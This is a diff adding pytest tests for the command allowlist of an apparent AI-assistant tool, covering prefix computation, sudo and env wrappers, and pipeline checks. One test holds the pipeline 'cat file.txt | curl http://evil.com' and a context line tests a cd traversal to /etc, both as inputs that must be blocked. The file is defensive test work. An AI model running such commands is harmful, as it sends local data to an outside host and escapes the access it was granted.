@@ -8,12 +8,15 @@ from ai_assist.config import AiAssistConfig
 from ai_assist.filesystem_tools import (
     ALLOWED_COMMANDS_FILE,
     ALLOWED_PATHS_FILE,
+    PRIVILEGE_WRAPPERS,
     SHELL_BUILTINS,
+    TRANSPARENT_WRAPPERS,
     FilesystemTools,
     _extract_command_argument_paths,
     _is_safe_env_assignment,
     _split_shell_commands,
     _strip_shell_comments,
+    compute_allowlist_prefix,
     extract_command_names,
 )
 
@@ -1277,3 +1280,176 @@ async def test_cd_path_traversal_blocked(tmp_path):
 
     result = await tools.execute_tool("execute_command", {"command": f"cd {allowed_dir}/../../etc"})
     assert "not allowed" in result.lower() or "outside allowed" in result.lower()
+
+
+# --- Prefix-based allowlist tests ---
+
+
+class TestComputeAllowlistPrefix:
+    """Tests for compute_allowlist_prefix()"""
+
+    def test_git_subcommand(self):
+        assert compute_allowlist_prefix("git status --short") == "git status"
+
+    def test_python_script(self):
+        assert compute_allowlist_prefix("python3 scripts/check.py --verbose") == "python3 scripts/check.py"
+
+    def test_python_inline_code(self):
+        assert compute_allowlist_prefix('python3 -c "import os"') == "python3"
+
+    def test_bash_inline_code(self):
+        assert compute_allowlist_prefix('bash -c "echo hello"') == "bash"
+
+    def test_sudo_preserved(self):
+        assert compute_allowlist_prefix("sudo git status") == "sudo git status"
+
+    def test_env_stripped(self):
+        assert compute_allowlist_prefix("env FOO=bar git diff") == "git diff"
+
+    def test_simple_command(self):
+        assert compute_allowlist_prefix("ls -la /tmp") == "ls /tmp"
+
+    def test_subcommand_tool(self):
+        assert compute_allowlist_prefix("tvly search foo bar") == "tvly search"
+
+    def test_grep(self):
+        assert compute_allowlist_prefix("grep -r pattern .") == "grep pattern"
+
+    def test_nohup_stripped(self):
+        assert compute_allowlist_prefix("nohup python3 scripts/run.py") == "python3 scripts/run.py"
+
+    def test_sudo_with_flags(self):
+        assert compute_allowlist_prefix("sudo -u user git push") == "sudo git push"
+
+    def test_for_loop_returns_none(self):
+        assert compute_allowlist_prefix("for i in 1 2 3; do echo hi; done") is None
+
+    def test_echo_returns_none(self):
+        assert compute_allowlist_prefix("echo hello") is None
+
+    def test_empty_returns_none(self):
+        assert compute_allowlist_prefix("") is None
+
+    def test_env_only_returns_none(self):
+        assert compute_allowlist_prefix("FOO=bar") is None
+
+
+class TestShellKeywordsInBuiltins:
+    """Shell flow-control keywords should be in SHELL_BUILTINS"""
+
+    def test_for_loop_keywords(self):
+        for kw in ("for", "do", "done", "in"):
+            assert kw in SHELL_BUILTINS, f"{kw} should be a shell builtin"
+
+    def test_conditional_keywords(self):
+        for kw in ("if", "then", "else", "elif", "fi"):
+            assert kw in SHELL_BUILTINS, f"{kw} should be a shell builtin"
+
+    def test_loop_keywords(self):
+        for kw in ("while", "until", "case", "esac"):
+            assert kw in SHELL_BUILTINS, f"{kw} should be a shell builtin"
+
+    def test_extract_for_loop_only_builtins(self):
+        result = extract_command_names("for i in 1 2 3; do echo hi; done")
+        assert all(n in SHELL_BUILTINS for n in result)
+
+
+class TestWrapperConstants:
+    """Wrapper command sets are properly defined"""
+
+    def test_transparent_wrappers(self):
+        for cmd in ("env", "nohup", "nice", "timeout"):
+            assert cmd in TRANSPARENT_WRAPPERS
+
+    def test_privilege_wrappers(self):
+        for cmd in ("sudo", "su", "doas"):
+            assert cmd in PRIVILEGE_WRAPPERS
+
+    def test_no_overlap(self):
+        assert not TRANSPARENT_WRAPPERS & PRIVILEGE_WRAPPERS
+
+
+class TestPrefixMatching:
+    """Tests for prefix-based command matching"""
+
+    @pytest.mark.asyncio
+    async def test_git_status_allowed_blocks_git_push(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git status"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert tools._is_command_prefix_allowed("git status --short")
+        assert not tools._is_command_prefix_allowed("git push origin main")
+
+    @pytest.mark.asyncio
+    async def test_python_script_allowed_blocks_python_c(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["python3 scripts/check.py"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert tools._is_command_prefix_allowed("python3 scripts/check.py --verbose")
+        assert not tools._is_command_prefix_allowed('python3 -c "import os"')
+
+    @pytest.mark.asyncio
+    async def test_sudo_not_matched_by_bare_command(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git status"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert not tools._is_command_prefix_allowed("sudo git status")
+
+    @pytest.mark.asyncio
+    async def test_sudo_entry_matches_sudo_command(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["sudo git status"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert tools._is_command_prefix_allowed("sudo git status --short")
+
+    @pytest.mark.asyncio
+    async def test_env_wrapper_stripped(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git diff"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert tools._is_command_prefix_allowed("env FOO=bar git diff HEAD")
+
+    @pytest.mark.asyncio
+    async def test_backward_compat_bare_command(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert tools._is_command_prefix_allowed("git push origin main")
+        assert tools._is_command_prefix_allowed("git status")
+
+    @pytest.mark.asyncio
+    async def test_pipeline_all_segments_checked(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat", "grep"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert tools._is_command_prefix_allowed("cat file.txt | grep pattern")
+
+    @pytest.mark.asyncio
+    async def test_pipeline_blocks_if_any_segment_fails(self):
+        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat"])
+        tools = FilesystemTools(config, load_user_config=False)
+        assert not tools._is_command_prefix_allowed("cat file.txt | curl http://evil.com")
+
+
+class TestLoadFiltersJunk:
+    """_load_user_allowed_commands filters invalid entries"""
+
+    def test_skips_single_char(self, tmp_path):
+        json_file = tmp_path / ALLOWED_COMMANDS_FILE
+        json_file.write_text(json.dumps(["1", "git", "x"]))
+
+        with pytest.MonkeyPatch.context() as mp:
+            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
+            config = AiAssistConfig(anthropic_api_key="test")
+            tools = FilesystemTools(config)
+
+        assert "git" in tools.allowed_commands
+        assert "1" not in tools.allowed_commands
+        assert "x" not in tools.allowed_commands
+
+    def test_skips_shell_keywords(self, tmp_path):
+        json_file = tmp_path / ALLOWED_COMMANDS_FILE
+        json_file.write_text(json.dumps(["do", "done", "for", "git"]))
+
+        with pytest.MonkeyPatch.context() as mp:
+            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
+            config = AiAssistConfig(anthropic_api_key="test")
+            tools = FilesystemTools(config)
+
+        assert "git" in tools.allowed_commands
+        assert "do" not in tools.allowed_commands
+        assert "done" not in tools.allowed_commands
+        assert "for" not in tools.allowed_commands
